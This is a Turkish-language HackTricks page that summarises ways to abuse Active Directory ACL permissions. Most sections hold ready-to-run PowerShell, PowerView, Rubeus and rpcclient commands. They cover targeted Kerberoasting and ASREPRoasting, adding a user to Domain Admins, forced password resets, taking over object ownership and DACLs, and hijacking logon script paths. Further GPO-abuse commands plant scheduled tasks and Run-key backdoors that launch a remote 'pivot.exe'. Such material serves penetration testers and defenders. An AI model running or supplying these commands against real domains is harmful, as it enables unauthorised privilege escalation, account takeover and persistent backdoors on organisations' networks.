# Active Directory ACL/ACE'leri Kötüye Kullanma

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşün</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi **HackTricks'te reklam vermek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli olan zayıflıkları bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

**Bu sayfa çoğunlukla [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) ve [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) adreslerindeki tekniklerin özetidir. Daha fazla ayrıntı için orijinal makaleleri kontrol edin.**


## **Kullanıcı Üzerinde GenericAll Hakları**
Bu ayrıcalık, saldırganın hedef kullanıcı hesabı üzerinde tam kontrol sağlar. `Get-ObjectAcl` komutunu kullanarak `GenericAll` hakları doğrulandığında, saldırgan aşağıdaki işlemleri yapabilir:

- **Hedefin Parolasını Değiştirme**: `net user <kullanıcıadı> <parola> /domain` komutunu kullanarak saldırgan kullanıcının parolasını sıfırlayabilir.
- **Hedefe Yönelik Kerberoasting**: Kullanıcının hesabına bir SPN atayarak kerberoastable hale getirin, ardından Rubeus ve targetedKerberoast.py kullanarak ticket-granting ticket (TGT) hash'lerini çıkarın ve kırmaya çalışın.
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Hedefe Yönelik ASREPRoasting**: Kullanıcının ön kimlik doğrulamasını devre dışı bırakarak hesabını ASREPRoasting saldırısına karşı savunmasız hale getirin.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Grup Üzerinde GenericAll Yetkileri**
Bu ayrıcalık, saldırganın `Domain Admins` gibi bir grupta `GenericAll` yetkilerine sahipse grup üyeliklerini manipüle etmesine olanak tanır. Saldırgan, `Get-NetGroup` komutuyla grubun ayırt edici adını belirledikten sonra aşağıdaki işlemleri yapabilir:

- **Kendini Domain Admins Grubuna Eklemek**: Bu doğrudan komutlar veya Active Directory veya PowerSploit gibi modüller kullanılarak yapılabilir.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Bilgisayar/Kullanıcı üzerine Yazma**
Bir bilgisayar nesnesi veya bir kullanıcı hesabı üzerinde bu yetkilere sahip olmak aşağıdakileri mümkün kılar:

- **Kerberos Kaynak Tabanlı Kısıtlı Delege**: Bir bilgisayar nesnesini ele geçirmek için kullanılır.
- **Gölge Kimlik Bilgileri**: Bu teknik kullanılarak bir bilgisayar veya kullanıcı hesabını taklit etmek için yetkileri kullanarak gölge kimlik bilgileri oluşturulabilir.

## **Grup üzerinde WriteProperty**
Bir kullanıcının belirli bir grup (örneğin, `Domain Admins`) için tüm nesneler üzerinde `WriteProperty` yetkisine sahip olması durumunda, aşağıdakiler yapılabilir:

- **Kendini Domain Admins Grubuna Eklemek**: `net user` ve `Add-NetGroupUser` komutlarını birleştirerek bu yöntemle etki alanı içinde ayrıcalık yükseltme gerçekleştirilebilir.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Grup Üzerinde Kendi (Kendi Üyeliği)**
Bu ayrıcalık, saldırganlara, grup üyeliğini doğrudan manipüle eden komutlar aracılığıyla kendilerini `Domain Admins` gibi belirli gruplara eklemelerine olanak tanır. Kendi eklemesine izin vermek için aşağıdaki komut dizisi kullanılır:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Kendi Üyeliği)**
Benzer bir yetki olan bu, saldırganların, ilgili gruplarda `WriteProperty` yetkisine sahipse grup özelliklerini değiştirerek doğrudan kendilerini gruplara eklemelerine olanak tanır. Bu yetkinin doğrulaması ve uygulanması aşağıdaki adımlarla gerçekleştirilir:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**
Kullanıcı üzerinde `User-Force-Change-Password` için `ExtendedRight` tutmak, mevcut şifreyi bilmeksizin şifre sıfırlamaya olanak tanır. Bu hakkın doğrulanması ve istismarı PowerShell veya alternatif komut satırı araçları aracılığıyla gerçekleştirilebilir. Etkileşimli oturumlar ve etkileşimsiz ortamlar için tek satırlık yöntemler de dahil olmak üzere bir kullanıcının şifresini sıfırlamanın birkaç yöntemi sunulmaktadır. Komutlar, basit PowerShell çağrılarından Linux üzerinde `rpcclient` kullanmaya kadar çeşitli saldırı vektörlerinin kullanılmasını göstermektedir.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **Gruba WriteOwner Yetkisi Verme**
Bir saldırgan, bir grubun üzerinde `WriteOwner` yetkisine sahip olduğunu tespit ederse, grubun sahipliğini kendisine değiştirebilir. Bu özellikle söz konusu grup `Domain Admins` ise etkilidir, çünkü sahipliği değiştirmek grup özellikleri ve üyelikleri üzerinde daha geniş bir kontrol sağlar. Süreç, doğru nesneyi `Get-ObjectAcl` kullanarak belirlemeyi ve ardından `Set-DomainObjectOwner` kullanarak sahibi, SID veya isim ile değiştirmeyi içerir.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **Kullanıcı Üzerinde GenericWrite**
Bu izin, bir saldırganın kullanıcı özelliklerini değiştirmesine olanak tanır. Özellikle, `GenericWrite` erişimi ile saldırgan, kullanıcı oturum açma işlemi sırasında kötü amaçlı bir betik çalıştırmak için kullanıcının oturum açma betiği yolunu değiştirebilir. Bu, hedef kullanıcının `scriptpath` özelliğini saldırganın betiğine yönlendirmek için `Set-ADObject` komutunu kullanarak gerçekleştirilir.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **Grup Üzerinde GenericWrite**
Bu yetki ile saldırganlar, kendilerini veya diğer kullanıcıları belirli gruplara ekleyebilir veya grup üyelerini çıkarabilir. Bu işlem, bir kimlik nesnesi oluşturmayı, bu nesneyi kullanarak kullanıcıları bir gruptan eklemeyi veya çıkarmayı ve PowerShell komutlarıyla üyelik değişikliklerini doğrulamayı içerir.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**
Bir AD nesnesini sahiplenmek ve üzerinde `WriteDACL` yetkisine sahip olmak, saldırganın nesne üzerinde kendilerine `GenericAll` yetkilerini vermesine olanak tanır. Bu, ADSI manipülasyonu aracılığıyla gerçekleştirilir ve nesne üzerinde tam kontrol sağlar ve grup üyeliklerini değiştirme yeteneği sunar. Bununla birlikte, Active Directory modülünün `Set-Acl` / `Get-Acl` cmdlet'lerini kullanarak bu yetkileri sömürmeye çalışırken bazı sınırlamalar bulunmaktadır.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Etki Alanında Çoğaltma (DCSync)**
DCSync saldırısı, etki alanında belirli çoğaltma izinlerini kullanarak Birincil Etki Alanı Denetleyicisini taklit etmeyi ve kullanıcı kimlik bilgileri de dahil olmak üzere verileri senkronize etmeyi amaçlar. Bu güçlü teknik, `DS-Replication-Get-Changes` gibi izinlere ihtiyaç duyar ve saldırganlara Birincil Etki Alanı Denetleyicisine doğrudan erişim olmadan AD ortamından hassas bilgileri çıkarmalarını sağlar.
[**DCSync saldırısı hakkında daha fazla bilgi için buraya tıklayın.**](../dcsync.md)

## GPO Yetkilendirme <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Yetkilendirme

Grup İlkesi Nesnelerini (GPO'lar) yönetmek için yetkilendirilmiş erişim, önemli güvenlik riskleri oluşturabilir. Örneğin, `offense\spotless` gibi bir kullanıcıya GPO yönetimi hakları verilirse, **WriteProperty**, **WriteDacl** ve **WriteOwner** gibi ayrıcalıklara sahip olabilir. Bu izinler kötü amaçlı amaçlar için kötüye kullanılabilir ve PowerView kullanılarak tespit edilebilir:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

### GPO İzinlerini Sıralama

Yanlış yapılandırılmış GPO'ları belirlemek için PowerSploit'in cmdlet'leri birleştirilebilir. Bu, belirli bir kullanıcının yönetme izinlerine sahip olduğu GPO'ların keşfedilmesini sağlar:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

**Belirli Bir Politikayı Uygulayan Bilgisayarlar**: Belirli bir GPO'nun hangi bilgisayarlara uygulandığını belirlemek, potansiyel etki alanının kapsamını anlamaya yardımcı olabilir.
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```

**Belirli Bir Bilgisayara Uygulanan Politikalar**: Belirli bir bilgisayara uygulanan politikaları görmek için `Get-DomainGPO` gibi komutlar kullanılabilir.

**Belirli Bir Politikaya Uygulanan OU'lar**: Belirli bir politikadan etkilenen organizasyon birimlerini (OU'lar) belirlemek için `Get-DomainOU` kullanılabilir.

### GPO Kötüye Kullanımı - New-GPOImmediateTask

Yanlış yapılandırılmış GPO'lar, örneğin hemen planlanmış bir görev oluşturarak kodu yürütmek için kötüye kullanılabilir. Bu, etkilenen makinelerdeki yerel yöneticiler grubuna bir kullanıcı eklemek için yapılabilir ve ayrıcalıkları önemli ölçüde yükseltebilir:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy modülü - GPO Kötüye Kullanımı

GroupPolicy modülü, yüklendiğinde yeni GPO'ların oluşturulmasına ve bağlanmasına olanak tanır ve etkilenen bilgisayarlarda geri kapıları çalıştırmak için kayıt defteri değerlerinin ayarlanmasını sağlar. Bu yöntem, GPO'nun güncellenmesini ve bir kullanıcının bilgisayara oturum açmasını gerektirir.
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - GPO Kötüye Kullanımı

SharpGPOAbuse, mevcut GPO'ları kötüye kullanmak için görevler eklemeyi veya ayarları değiştirmeyi sağlayan bir yöntem sunar. Bu araç, değişiklikler uygulanmadan önce mevcut GPO'ları değiştirmeyi veya yeni GPO'lar oluşturmak için RSAT araçlarını kullanmayı gerektirir:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Zorla Politika Güncellemesi

GPO güncellemeleri genellikle yaklaşık 90 dakikada bir gerçekleşir. Bu süreci hızlandırmak için, özellikle bir değişiklik uyguladıktan sonra, hedef bilgisayarda `gpupdate /force` komutu kullanılabilir. Bu komut, GPO'lara yapılan herhangi bir değişikliğin otomatik güncelleme döngüsünü beklemeksizin uygulanmasını sağlar.

### İçerik

Belirli bir GPO için Zamanlanmış Görevlerin incelenmesi, `Hatalı Yapılandırılmış Politika` gibi, `evilTask` gibi görevlerin eklenmesinin doğrulanmasını sağlar. Bu görevler, sistem davranışını değiştirmeyi veya ayrıcalıkları yükseltmeyi amaçlayan komut dosyaları veya komut satırı araçları aracılığıyla oluşturulur.

`New-GPOImmediateTask` tarafından oluşturulan XML yapılandırma dosyasında görevin yapısı, yürütülecek komutu ve tetikleyicilerini belirtir. Bu dosya, zamanlanmış görevlerin GPO'lar içinde nasıl tanımlandığını ve yönetildiğini temsil eder ve politika uygulamasının bir parçası olarak keyfi komutların veya komut dosyalarının yürütülmesi için bir yöntem sağlar.

### Kullanıcılar ve Gruplar

GPO'lar ayrıca hedef sistemlerde kullanıcı ve grup üyeliklerinin manipülasyonuna izin verir. Saldırganlar, GPO yönetim izinlerinin devredilmesi yoluyla, kullanıcıları ayrıcalıklı gruplara, örneğin yerel `yöneticiler` grubuna ekleyebilir. Bu, politika dosyalarının değiştirilmesine izin veren GPO yönetim izinlerinin devredilmesiyle mümkündür.

Kullanıcılar ve Gruplar için XML yapılandırma dosyası, bu değişikliklerin nasıl uygulandığını belirtir. Bu dosyaya girişler ekleyerek, belirli kullanıcılara etkilenen sistemlerde yükseltilmiş ayrıcalıklar verilebilir. Bu yöntem, GPO manipülasyonu aracılığıyla doğrudan ayrıcalık yükseltme için bir yaklaşım sunar.

Ayrıca, logon/logoff komut dosyalarını kullanma, otomatik çalıştırmalar için kayıt defteri anahtarlarını değiştirme, .msi dosyaları aracılığıyla yazılım yükleme veya hizmet yapılandırmalarını düzenleme gibi kodu yürütme veya kalıcılığı sürdürme için ek yöntemler de düşünülebilir. Bu teknikler, GPO'ların kötüye kullanımı yoluyla erişimi sürdürme ve hedef sistemleri kontrol etme için çeşitli olanaklar sunar.

## Referanslar

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En önemli güvenlik açıklarını bulun ve daha hızlı düzeltin. Intruder saldırı yüzeyinizi takip eder, proaktif tehdit taramaları yapar, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklam vermek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da takip edin 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live).
* Hacking hilelerinizi göndererek HackTricks ve HackTricks Cloud github depolarına PR göndererek **hacking hilelerinizi paylaşın**.

</details>
